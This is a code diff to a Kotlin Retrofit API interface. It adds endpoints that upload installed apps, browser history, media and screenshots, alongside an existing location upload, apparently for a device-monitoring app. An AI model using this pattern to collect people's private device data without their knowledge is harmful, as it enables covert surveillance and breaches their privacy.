@@ -31,6 +31,26 @@ interface ApiService {
         @Body data: List<LocationData>
     ): Response<ApiResponse>
 
+    @POST("apps/")
+    suspend fun uploadApps(
+        @Body data: List<AppData>
+    ): Response<ApiResponse>
+
+    @POST("browser-history/")
+    suspend fun uploadBrowserHistory(
+        @Body data: List<BrowserHistoryData>
+    ): Response<ApiResponse>
+
+    @POST("media/")
+    suspend fun uploadMedia(
+        @Body data: List<MediaData>
+    ): Response<ApiResponse>
+
+    @POST("screenshots/")
+    suspend fun uploadScreenshots(
+        @Body data: List<ScreenshotData>
+    ): Response<ApiResponse>
+
     @GET("status/")
     suspend fun getStatus(): Response<ApiResponse>
 }
